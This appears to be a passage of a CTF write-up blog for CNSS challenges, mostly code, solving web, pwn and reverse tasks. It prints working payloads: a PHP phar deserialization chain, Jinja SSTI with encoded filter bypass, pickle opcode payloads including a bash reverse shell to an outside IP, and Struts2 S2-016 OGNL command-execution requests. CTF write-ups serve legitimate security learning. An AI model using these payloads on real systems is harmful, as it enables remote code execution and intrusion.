&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;   <span class="comment">//Do you know &#x27;Php ARchive&#x27;?</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-7cac117389557ba335fe0ee1073c4a01_1440w.png" alt="" /></p><p><code>file_get_contents</code><code>CNSS</code>(echo)<code>Show</code><code>__toString()</code><code>CN55</code><code>__invoke()</code></p><p><code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">CN55</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>]-&gt;params[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&quot;f1ag.php&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//meta-datamanifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><code>phar.jpg</code><code>md5(phar.jpg)</code><br /><br /><code>url/file.php?file=phar://upload/628941e623f5a967093007bf39be805f.jpg</code></p><p><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we1l!&#125;</code><br /><code>pop+phar</code></p><h2 id="cnss"><a class="markdownIt-Anchor" href="#cnss"></a>  CNSS</h2><p><code>&#123;&#123;7*7&#125;&#125;SSTI</code>(jinja)<br /><code></code>ban</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__.__subclasses__()[<span class="number">133</span>].__init__.__globals__.popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">.__class__ =&gt; [<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line">.__base__ =&gt; [<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>]</span><br><span class="line">.__subclasses__ =&gt; [<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]</span><br><span class="line">.__init__ =&gt; [<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>]</span><br><span class="line">.__globals__ =&gt; [<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>]</span><br><span class="line">.popen =&gt; [<span class="string">&quot;\160\157\160\145\156&quot;</span>]</span><br><span class="line">cat /f* =&gt; <span class="string">&quot;\143\141\164\40\57\146\52&quot;</span></span><br><span class="line">.read =&gt; [<span class="string">&quot;\162\145\141\144&quot;</span>]</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>][<span class="string">&quot;\160\157\160\145\156&quot;</span>](<span class="string">&quot;\143\141\164\40\57\146\52&quot;</span>)[<span class="string">&quot;\162\145\141\144&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:5000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;y0u_Fxxking_ru1n3d_My_ch4tr00m!&#125;</code></p><p><code>SSTI</code></p><h2 id="cnssflag"><a class="markdownIt-Anchor" href="#cnssflag"></a>  CNSSFlag</h2><p><code>main.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> buyInfo</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hi</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, money</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.money = money</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.name == other.name <span class="keyword">and</span> self.money == other.money</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = flask.request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;View code in /code to buy flag.&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;R&#x27;</span> <span class="keyword">in</span> user.upper():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    user = pickle.loads(user.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(user.name, user.money)</span><br><span class="line">    <span class="built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)</span><br><span class="line">    <span class="keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):</span><br><span class="line">        buyInfo.reset()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;CNSSflag <span class="subst">&#123;flag&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>():</span><br><span class="line">    file = <span class="string">&#x27;code.zip&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.send_file(file, mimetype=<span class="string">&#x27;application/zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p><code>buyInfo.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">MONEY = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    <span class="keyword">global</span> NAME, MONEY</span><br><span class="line">    NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">    MONEY = <span class="number">2000</span></span><br></pre></td></tr></table></figure><p><code>r R</code><code>Rich</code><code>user = pickle.loads(user.encode('utf-8'))</code><code>pickle</code>ban<code>R</code><code>__reduce__</code><code>PHP</code><code>__wakeup</code>()<br /><code>opcode</code><br /><a href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a><br /><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br /><a href="https://www.kinsomnia.cn/index.php/2023/12/11/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://www.kinsomnia.cn/index.php/2023/12/11/pickle/</a><br /><a href="https://tttang.com/archive/1782/">https://tttang.com/archive/1782/</a><br /><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a><br /><a href="http://ngc660.cn/2022/11/%E6%9C%80%E8%BF%91%E7%A2%B0%E5%88%B0%E7%9A%84-python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%80%BB%E7%BB%93/">http://ngc660.cn/2022/11/-python-pickle-/</a><br /><code>c o i</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(S<span class="string">&#x27;\x52ich&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (S<span class="string">&#x27;\x52ich&#x27;</span>%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">unicode</span><br><span class="line">(V\u0052ich</span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (V\u0052ich%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">cbuyInfojio</span><br><span class="line">(i__main__</span><br><span class="line">Hi</span><br><span class="line">(dS<span class="string">&#x27;money&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">sS<span class="string">&#x27;name&#x27;</span></span><br><span class="line">cbuyInfo</span><br><span class="line">NAME</span><br><span class="line">sb.</span><br><span class="line">payload: (i__main__%0aHi%0a(dS<span class="string">&#x27;money&#x27;</span>%0aI2000%<span class="number">0</span>asS<span class="string">&#x27;name&#x27;</span>%0acbuyInfo%0aNAME%<span class="number">0</span>asb.</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;fl4g_0nly_f0r_r1ch_k1d5&#125;</code><br /><code>pickleR</code></p><h2 id="tomcatcat~"><a class="markdownIt-Anchor" href="#tomcatcat~"></a>  Tomcat?cat~</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://152.136.11.155:10110/user.action</span><br><span class="line"></span><br><span class="line"> ____  _              _       ____    ____</span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __</span><br><span class="line">\___ \| __| <span class="string">&#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;</span>_ \</span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">                                      Author By HatBoy</span><br><span class="line"></span><br><span class="line">[+] URL:http://152.136.11.155:10110/user.action</span><br><span class="line">[*] ----------------results------------------</span><br><span class="line">[*] http://152.136.11.155:10110/user.action : S2-016</span><br></pre></td></tr></table></figure><p><code>payload</code><a href="https://blog.csdn.net/qq_36241198/article/details/114937777">https://blog.csdn.net/qq_36241198/article/details/114937777</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> <span class="built_in">env</span> fake flag</span><br><span class="line">redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.<span class="built_in">set</span>%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="built_in">exec</span>%28%27env%27%29.getInputStream%28%29%29%7D</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> / flag</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22ls%22%2C%22/usr/local/tomcat/webapps/ROOT%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br><span class="line"></span><br><span class="line"> /usr/local/tomcat/webapps/ROOT/ </span><br><span class="line">redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span>flaaaaaaag/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22cat%22%2C%22/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D </span><br></pre></td></tr></table></figure><p><code>CNSS&#123;t0mcat_!s_4_cute_cat_m1a0!&#125;</code><br /><code>fake flag: FLAG=flag&#123;7r0m_jwt_t0_struts2&#125;</code><code>jwt</code></p><p><code>struts2</code></p><h2 id="newsql"><a class="markdownIt-Anchor" href="#newsql"></a>  newsql()</h2><p><code>MySQL8</code><code>SQL</code></p><h2 id="cnssflag"><a class="markdownIt-Anchor" href="#cnssflag"></a>  CNSSFlag</h2><p><code>flag</code><code>flag is in /flag.txt</code><code>shell</code>(flag)<br /><code>&amp;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">o.</span><br><span class="line"></span><br><span class="line">payload: (cos%<span class="number">0</span>asystem%0aS%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0ao.</span><br><span class="line"></span><br><span class="line">(S<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">payload: (S%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0aios%<span class="number">0</span>asystem%0a.</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;fl4g_f0r_smArt_k1ds&#125;</code><br /><code>pickleshell</code></p><h2 id="ruoyi"><a class="markdownIt-Anchor" href="#ruoyi"></a>  RuoYi()</h2><p><a href="https://forum.butian.net/share/2796">https://forum.butian.net/share/2796</a><br /></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h2 id="nc-nc"><a class="markdownIt-Anchor" href="#nc-nc"></a> nc? nc!</h2><p><code>pwn</code><code>ls</code><code>cat flag</code></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><p><img src="https://picx.zhimg.com/80/v2-06d6c5046f8e882a5e6676370b6242a2_1440w.png" alt="" /><br /><code>IDA</code></p><h2 id="flag"><a class="markdownIt-Anchor" href="#flag"></a> flag</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hint:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. Open in IDA and Learn about `Strings` to find the first part of the flag&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. Learn about `Functions` to find the second part of the flag which is the name of a function&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. The hint for the last part is in the function you found in the second part&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>flag1</code><code>shift+F12</code></p><p><code>flag2</code><code>Functions</code><br /><img src="https://picx.zhimg.com/80/v2-2bf48124e57f02427a7a33ac5722d3ca_1440w.png" alt="" /></p><p><code>flag3</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Learn about `Xref` and Find out which function refers me to get the last part of the flag!&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>views&gt;Open subsviews&gt;Function Call</code></p><p><img src="https://picx.zhimg.com/80/v2-02ebe7d85228cc2243618ce84837dd42_1440w.png" alt="" /></p><p><code>CNSS&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />()<code>IDA</code></p><h2 id="-"><a class="markdownIt-Anchor" href="#-"></a>  </h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">12</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  __int64 v6[<span class="number">12</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F0h] [rbp+70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0x731047656E6F7579</span>i64;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0x761B45794B10407D</span>i64;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0x6E005B71491F585F</span>i64;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0x45045205575D01</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">4</span>], <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  eNc0d3(v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">eNc0d3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">26</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(a1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">0x79</span>, <span class="number">0x75</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x10</span>, <span class="number">0x73</span>,</span><br><span class="line">     <span class="number">0x7D</span>, <span class="number">0x40</span>, <span class="number">0x10</span>, <span class="number">0x4B</span>, <span class="number">0x79</span>, <span class="number">0x45</span>, <span class="number">0x1B</span>, <span class="number">0x76</span>,</span><br><span class="line">     <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x1F</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x5B</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>,</span><br><span class="line">     <span class="number">0x01</span>, <span class="number">0x5D</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x52</span>, <span class="number">0x04</span>, <span class="number">0x45</span>, <span class="number">0x00</span>]</span><br><span class="line">key = <span class="number">26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i] ^ (key+i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>cnss&#123;X0R_c4n_b3_us3d_t0_3nc0d3&#125;</code><br /></p><p><code></code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (a2[v4 &amp; <span class="number">3</span>] + v4);</span><br><span class="line">    v4 += <span class="number">289739793</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (a2[(v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD Str[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">  v5[<span 